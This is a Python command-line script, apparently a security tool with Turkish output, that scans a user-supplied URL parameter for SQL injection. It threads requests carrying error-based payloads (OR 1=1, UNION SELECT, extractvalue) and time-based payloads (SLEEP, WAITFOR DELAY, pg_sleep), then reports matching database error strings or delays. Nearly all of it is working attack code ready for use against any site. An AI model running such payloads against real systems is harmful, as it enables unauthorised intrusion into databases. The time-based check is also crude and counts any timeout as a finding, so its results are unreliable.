#!/usr/bin/env python3
"""
Advanced SQL Injection Tester
=============================
Tests URL parameters for error-based and time-based SQLi vulnerabilities.
"""
import requests
import sys
import time
import urllib.parse
import concurrent.futures

ERROR_PAYLOADS = [
    "'", "\"", "' OR 1=1--", "' OR '1'='1", "\" OR \"1\"=\"1",
    "admin' --", "' UNION SELECT NULL--", "1' ORDER BY 1--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
    "' AND extractvalue(rand(),concat(0x3a,version()))--",
    "1; WAITFOR DELAY '0:0:5'--"
]

TIME_PAYLOADS = [
    ("SLEEP(5)", 5),
    ("WAITFOR DELAY '0:0:5'", 5),
    ("pg_sleep(5)", 5)
]

ERRORS = [
    "syntax error", "mysql_fetch", "ora-", "sql syntax",
    "mariadb", "you have an error in your sql syntax",
    "unclosed quotation mark", "microsoft ole db provider for sql server"
]

def check_error_sqli(url, payload):
    try:
        test_url = f"{url}{urllib.parse.quote(payload)}"
        res = requests.get(test_url, timeout=5)
        for err in ERRORS:
            if err.lower() in res.text.lower():
                return True, test_url, payload, err
    except requests.RequestException:
        pass
    return False, None, payload, None

def check_time_sqli(url, payload, sleep_time):
     try:
         test_url = f"{url}{urllib.parse.quote(payload)}"
         start_time = time.time()
         requests.get(test_url, timeout=10) # Timeout > sleep_time
         end_time = time.time()
         
         if (end_time - start_time) >= sleep_time:
             return True, test_url, payload
     except requests.exceptions.Timeout:
         # Timeout olduysa sleep çalışmış olabilir
         return True, test_url, payload
     except requests.RequestException:
         pass
     return False, None, payload

def test_sqli(url):
    print(f"[*] Test ediliyor: {url}\n")
    found = False

    print("[*] Error-Based SQLi Testleri Başlıyor...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_error_sqli, url, payload): payload for payload in ERROR_PAYLOADS}
        for future in concurrent.futures.as_completed(futures):
            success, test_url, payload, err = future.result()
            if success:
                print(f"[!] Olası Error-Based SQLi Bulundu!")
                print(f"  [+] Payload: {payload}")
                print(f"  [+] Hata İmzası: {err}")
                print(f"  [+] URL: {test_url}\n")
                found = True

    print("\n[*] Time-Based SQLi Testleri Başlıyor...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
         futures = {executor.submit(check_time_sqli, url, p[0], p[1]): p for p in TIME_PAYLOADS}
         for future in concurrent.futures.as_completed(futures):
             success, test_url, payload = future.result()
             if success:
                 print(f"[!] Olası Time-Based SQLi Bulundu!")
                 print(f"  [+] Payload: {payload}")
                 print(f"  [+] URL: {test_url}\n")
                 found = True

    if not found:
        print("\n[-] SQLi zafiyeti tespit edilemedi.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python SQLi_Tester.py <URL>")
        print("Örnek: python SQLi_Tester.py \"http://example.com/page.php?id=\"")
        sys.exit(1)
    test_sqli(sys.argv[1])
